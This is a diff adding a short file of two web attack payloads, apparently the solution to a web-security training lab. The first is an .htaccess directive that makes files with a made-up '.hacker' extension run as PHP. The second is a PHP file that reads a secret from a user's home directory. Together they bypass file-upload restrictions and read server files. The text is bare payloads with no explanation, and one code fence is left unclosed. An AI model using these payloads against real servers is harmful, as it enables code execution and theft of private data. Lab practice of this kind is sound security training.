@@ -1,0 +1,10 @@
+Payload 1 (.htaccess)
+```apache
+AddType application/x-httpd-php .hacker
+
+---
+
+Payload 2 (exploit.hacker)
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
